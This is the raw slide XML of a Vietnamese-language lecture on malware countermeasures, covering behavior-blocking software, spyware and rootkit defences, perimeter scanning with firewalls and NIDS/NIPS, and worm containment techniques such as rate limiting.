                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Biện pháp đối phó</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect l="7159" t="13875" r="7159" b="18500"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3733800" y="1676400"/>
            <a:ext cx="4840557" cy="4811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Content Placeholder 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CB9E5765-7951-4997-960A-7FDE4F1C3D26}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1656672"/>
            <a:ext cx="9677400" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Digital </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>immune system</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" noProof="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5065966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676400" y="346826"/>
            <a:ext cx="8911687" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Biện pháp đối phó</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 4"/>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l="3580" t="13875" b="18500"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3706320" y="1752600"/>
            <a:ext cx="848568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30480" y="2183070"/>
            <a:ext cx="3886199" cy="4708981"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900">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Tích </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>hợp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với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hệ</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điều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hành</a:t>
            </a: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Giám sát các </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>hành</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> vi</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Cố gắng mở, xem, xóa, sửa đổi các tập tin</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Cố gắng định dạng ổ đĩa</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Sửa đổi logic của các file thực thi</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Sửa đổi các cài đặt hệ thống quan trọng</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Viết kịch bản email / IM  để gửi nội dung thực thi</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Khởi tạo các kết nối mạng</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">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1 loại HIPS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>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Ø"/>
            </a:pPr>
            <a:endParaRPr lang="vi-VN" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF000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791162B6-5E90-4A41-A33E-C201F6CF9673}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="258382" y="1731264"/>
            <a:ext cx="5569089" cy="754053"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2500" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Host-based Behavior-blocking software</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2500">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="306339119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676400" y="346826"/>
            <a:ext cx="8911687" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Biện pháp đối phó</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="40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791162B6-5E90-4A41-A33E-C201F6CF9673}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="1752600"/>
            <a:ext cx="184731" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6BC604E9-C2C4-414D-8AE7-29BA9AEEDB99}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Spyware detection and removal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Rootkit countermeasures</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Perimeter Scanning Approaches</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Firewall, NIDS, NIPS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Giới hạn scan nội dung malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> 2 loại phần mềm giám sát:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Giám sát vào: đặt ở biên giữa mạng tổ chức và Internet, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>có thể là một phần của phần mềm lọc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>luồng vào của một router biên, external firewall, hoặc một bộ giám sát </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>thụ động riêng biệt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>, honeypot</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Giám sát ra: đặt ở biên giữa mạng tổ chức và Internet, hoặc giữa điểm ra của mạng LAN trong mạng tổ chức, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>có thể là một phần của phần mềm lọc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>luồng ra của một router LAN hoặc switch, external firewall, honeypot</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Tiếp cận tập hợp trí thông minh phân tán (Distributed Intelligence Gathering Approach)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="120629647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488818" y="381000"/>
            <a:ext cx="8911687" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Biện pháp đối phó</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1676400"/>
            <a:ext cx="11734800" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Biện pháp đối phó với Worm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Chồng chéo với các kỹ thuật chống virus</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Một khi worm năm trên hệ thống, antivirus có thể phát hiện</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Worm cũng gây ra hoạt động mạng đáng kể</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các tiếp cận việc bảo vệ đối với worm gồm:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Signature-based worm scan filtering: quét worm dựa trên chữ kí đã lọc</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Filter-based worm containment: tập trung vào nội dung worm hơn là quét chữ ký</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Payload-classification-based worm containment: kiểm tra các gói dữ liệu để tìm điểm dị thường</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Threshold random walk scan detection: giới hạn tỉ lệ lưu lượng truy cập giống như quét</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Rate limiting and rate halting: hạn chế lưu lượng đi ra khi đáp ứng một ngưỡng</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="132088852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981200" y="203486"/>
            <a:ext cx="8911687" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Biện pháp đối phó</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7FB17C72-14BA-442E-B96E-52F0661183CD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1676400"/>
            <a:ext cx="11734800" cy="4189514"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="342900" indent="-342900" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
              <a:defRPr sz="2400" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="514350" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
